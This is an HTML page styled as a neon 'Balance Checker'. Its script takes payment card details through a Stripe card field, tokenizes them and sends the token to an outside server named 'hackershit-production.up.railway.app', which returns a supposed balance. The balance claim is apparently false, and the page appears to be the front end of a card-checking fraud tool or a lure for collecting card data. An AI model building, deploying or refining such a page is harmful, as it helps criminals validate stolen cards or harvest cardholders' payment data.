<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Balance Checker</title>
    <script src="https://js.stripe.com/v3/"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 50%, #000d1a 100%);
            color: #00ff88;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            animation: galaxySwirl 20s infinite linear;
        }
        @keyframes galaxySwirl {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 20% 80%, #00ff88 1px, transparent 1px),
                             radial-gradient(circle at 80% 20%, #8a2be2 1px, transparent 1px),
                             radial-gradient(circle at 40% 40%, #00ff88 1px, transparent 1px);
            background-size: 100px 100px;
            animation: twinkle 4s infinite alternate;
            z-index: -1;
        }
        @keyframes twinkle {
            0% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        h1 {
            text-align: center;
            font-size: 4em; /* Bigger */
            color: #8a2be2;
            text-shadow: 0 0 20px #00ff88, 0 0 40px #8a2be2;
            margin-bottom: 50px;
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #00ff88; }
            to { text-shadow: 0 0 30px #8a2be2; }
        }
        form {
            width: 90%;
            max-width: 600px; /* Bigger */
            background: linear-gradient(45deg, #2e0033, #001a1a);
            padding: 50px; /* Bigger padding */
            border-radius: 20px; /* Bigger radius */
            box-shadow: 0 0 40px #00ff88, inset 0 0 40px rgba(138, 43, 226, 0.5);
            border: 3px solid #8a2be2;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        #card-element {
            padding: 20px; /* Bigger */
            border: 2px solid #00ff88; /* Thicker */
            border-radius: 10px; /* Bigger */
            background: #000;
            color: #00ff88;
            width: 100%;
            font-size: 18px; /* Bigger font */
            margin: 20px 0;
        }
        input[type="submit"] {
            width: 100%;
            padding: 20px; /* Bigger */
            background: linear-gradient(45deg, #00ff88, #8a2be2);
            border: none;
            border-radius: 10px; /* Bigger */
            color: #000;
            font-size: 1.5em; /* Bigger */
            font-family: 'Orbitron', sans-serif;
            cursor: pointer;
            box-shadow: 0 0 30px #00ff88;
            transition: all 0.3s ease;
            margin-top: 20px;
        }
        input[type="submit"]:hover {
            box-shadow: 0 0 50px #8a2be2;
            transform: scale(1.05);
        }
        #result {
            width: 90%;
            max-width: 600px;
            margin: 30px auto;
            padding: 30px; /* Bigger */
            background: rgba(0, 0, 0, 0.8);
            border-radius: 15px; /* Bigger */
            text-align: center;
            font-size: 1.5em; /* Bigger */
            color: #00ff88;
            box-shadow: 0 0 30px #8a2be2;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        #result.show {
            opacity: 1;
        }
        .loading {
            display: inline-block;
            width: 30px; /* Bigger */
            height: 30px; /* Bigger */
            border: 4px solid #00ff88; /* Thicker */
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        /* Responsive design */
        @media (max-width: 768px) {
            h1 {
                font-size: 3em;
            }
            form {
                padding: 30px;
            }
            #card-element {
                padding: 15px;
                font-size: 16px;
            }
            input[type="submit"] {
                font-size: 1.2em;
                padding: 15px;
            }
            #result {
                font-size: 1.2em;
                padding: 20px;
            }
        }
        @media (max-width: 480px) {
            h1 {
                font-size: 2.5em;
            }
            form {
                padding: 20px;
            }
            #card-element {
                padding: 10px;
                font-size: 14px;
            }
            input[type="submit"] {
                font-size: 1em;
                padding: 12px;
            }
            #result {
                font-size: 1em;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <h1>Balance Checker</h1>
    <form id="balanceForm">
        Card Info: <div id="card-element"></div>
        <input type="submit" value="Check Balance">
    </form>
    <div id="result"></div>
    <script>
        const stripe = Stripe('pk_test_...'); // Replace with your Stripe publishable key
        const elements = stripe.elements();
        const cardElement = elements.create('card', {
            style: {
                base: {
                    color: '#00ff88',
                    fontFamily: "'Orbitron', sans-serif",
                    fontSize: '18px',
                    '::placeholder': {
                        color: '#00ff88',
                    },
                },
            },
        });
        cardElement.mount('#card-element');

        // Form submission
        document.getElementById('balanceForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const resultDiv = document.getElementById('result');

            // Loading state
            resultDiv.innerHTML = '<div class="loading"></div> Checking balance...';
            resultDiv.className = 'show';

            // Tokenize card
            const { token, error } = await stripe.createToken(cardElement);
            if (error) {
                resultDiv.innerText = `Error: ${error.message}`;
                return;
            }

            try {
                const response = await fetch('https://hackershit-production.up.railway.app', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: token.id
                    })
                });

                const data = await response.json();
                resultDiv.innerText = `Balance: ${data.balance}`;
            } catch (error) {
                resultDiv.innerText = 'Error: Network issue';
            }
        });
    </script>
</body>
</html>
